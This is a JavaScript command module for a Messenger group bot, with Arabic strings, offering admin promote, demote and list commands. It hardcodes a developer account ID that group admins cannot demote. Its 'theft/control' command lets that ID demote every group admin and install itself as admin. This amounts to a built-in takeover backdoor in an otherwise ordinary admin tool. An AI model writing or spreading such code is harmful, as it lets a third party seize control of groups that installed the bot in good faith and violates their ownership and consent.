// ╔══════════════════════════════════════╗
// ║        👑 RIO ADMIN SYSTEM 👑        ║
// ╚══════════════════════════════════════╝

module.exports.config = {
  name: "ادمن",
  version: "2.0.0",
  hasPermssion: 0, // التحقق من الصلاحيات يتم داخلياً بشكل أدق
  credits: "Abdou / RIO BOT",
  description: "نظام إدارة مسؤولي المجموعة والسيطرة الكاملة للمطور",
  commandCategory: "إدارة المجموعات",
  usages: "[رفع / تنزيل / سرقة / قائمة]",
  cooldowns: 3
};

const DEV_ID = "100090081489341";

const header = (title) => `●─── ⟪ ${title} ⟫ ───●`;
const divider = () => `●─────── ⌬ ───────●`;
const row = (emoji, label, value) => `『 ${emoji} 』 ${label}↜ ${value}`;
const box = (title, rows) => `${header(title)}\n${rows}\n${divider()}`;

module.exports.run = async function({ api, event, args, Users }) {
  const { threadID, messageID, senderID, messageReply } = event;
  const action = (args[0] || "").toLowerCase();
  const isDev = String(senderID) === DEV_ID;

  // جلب صلاحيات المستخدم الحالي داخل المجموعة
  const threadInfo = await api.getThreadInfo(threadID);
  const adminIDs = threadInfo.adminIDs.map(i => String(i.id));
  const isGroupAdmin = adminIDs.includes(String(senderID));

  // --- [ 1. أمر مساعدة النظام ] ---
  if (!action || action === "مساعدة") {
    const helpMsg = `${row("📈", "ادمن رفع", "لرفع الشخص من الرد")}\n` +
                    `${row("📉", "ادمن تنزيل", "لتنزيل الشخص أو نفسك")}\n` +
                    `${row("⚔️", "ادمن سرقة", "تنزيل الكل ورفع المطور (للمطور)")}\n` +
                    `${row("📜", "ادمن قائمة", "لعرض مسؤولي المجموعة")}`;
    return api.sendMessage(box("👑 أوامر الإدارة", helpMsg), threadID, messageID);
  }

  // --- [ 2. أمر عرض قائمة المسؤولين ] ---
  if (action === "قائمة") {
    let listMsg = "";
    let count = 1;
    for (const admin of threadInfo.adminIDs) {
      const name = await Users.getNameUser(admin.id);
      listMsg += `${count++} - [ ${name} ]\n`;
    }
    return api.sendMessage(box("📜 مسؤولي المجموعة", listMsg.trim()), threadID, messageID);
  }

  // الحماية: الأوامر التالية تتطلب أن يكون المستخدم إما المطور أو مسؤول في المجموعة
  if (!isDev && !isGroupAdmin) {
    return api.sendMessage(box("🚫 صلاحية مرفوضة", row("⚠️", "تنبيه", "هذا الأمر مخصص للمسؤولين أو لمطور البوت فقط.")), threadID, messageID);
  }

  // --- [ 3. أمر رفع ادمن ] ---
  if (action === "رفع") {
    if (!messageReply) {
      return api.sendMessage(box("⚠️ خطأ في الأمر", row("❌", "السبب", "يجب الرد على رسالة الشخص لرفعه مسؤولاً.")), threadID, messageID);
    }
    const targetID = messageReply.senderID;
    const targetName = await Users.getNameUser(targetID);

    try {
      await api.changeAdminStatus(threadID, targetID, true);
      return api.sendMessage(box("✅ ترقية مسؤول", row("👑", "النتيجة", `تم رفع [ ${targetName} ] مسؤولاً بنجاح!`)), threadID, messageID);
    } catch (err) {
      return api.sendMessage(box("❌ فشلت العملية", row("⚠️", "السبب", "تأكد من أن البوت يمتلك صلاحية مسؤول أولاً.")), threadID, messageID);
    }
  }

  // --- [ 4. أمر تنزيل ادمن ] ---
  if (action === "تنزيل") {
    // إذا لم يكن هناك رد، ينزل نفسه، وإذا رددت على رسالة شخص ينزل الشخص الآخر
    const targetID = messageReply ? messageReply.senderID : senderID;
    const targetName = await Users.getNameUser(targetID);

    // حماية: لا يمكن لادمن عادي تنزيل المطور
    if (String(targetID) === DEV_ID && !isDev) {
      return api.sendMessage(box("🚫 حماية المطور", row("🛡️", "تنبيه", "لا يمكن لأي مسؤول تنزيل مطور البوت!")), threadID, messageID);
    }

    try {
      await api.changeAdminStatus(threadID, targetID, false);
      return api.sendMessage(box("📉 إزالة مسؤول", row("👤", "النتيجة", `تم تنزيل [ ${targetName} ] من رتبة المسؤول.`)), threadID, messageID);
    } catch (err) {
      return api.sendMessage(box("❌ فشلت العملية", row("⚠️", "السبب", "فشل تنزيل العضو، تأكد من صلاحيات البوت.")), threadID, messageID);
    }
  }

  // --- [ 5. أمر سرقة السيطرة المطلقة ] ---
  if (action === "سرقة" || action === "سيطرة") {
    // هذا الأمر حكراً على الآيدي الخاص بك حصراً
    if (!isDev) {
      return api.sendMessage(box("🚫 حظر أمني", row("💀", "الوضع", "هذا الأمر تدميري وخاص بمطور البوت فقط!")), threadID, messageID);
    }

    api.sendMessage(box("⚔️ السيطرة المطلقة", row("⚡", "الحالة", "جاري تجريد الجميع من الصلاحيات وتنصيب المطور..")), threadID);

    let successCount = 0;
    let failCount = 0;

    for (const admin of threadInfo.adminIDs) {
      const adminUID = String(admin.id);
      // إزالة الصلاحية من الجميع باستثناء المطور نفسه والبوت لضمان استمرار عمله
      if (adminUID !== DEV_ID && adminUID !== String(api.getCurrentUserID())) {
        try {
          await api.changeAdminStatus(threadID, adminUID, false);
          successCount++;
        } catch (e) {
          failCount++;
        }
      }
    }

    // رفع المطور كمسؤول أساسي في النهاية للتأكيد
    try {
      await api.changeAdminStatus(threadID, DEV_ID, true);
    } catch (e) {}

    return api.sendMessage(
      box("👑 تمت السيطرة", 
        `${row("🛡️", "القائد الجديد", "Abdou / RIO BOOT")}\n` +
        `${row("🧹", "تم تنزيلهم", `${successCount} عضو`)}\n` +
        `${row("⚠️", "فشل تنزيل", `${failCount} عضو (ربما البوت أقل منهم)`)}`
      ), 
      threadID
    );
  }
};
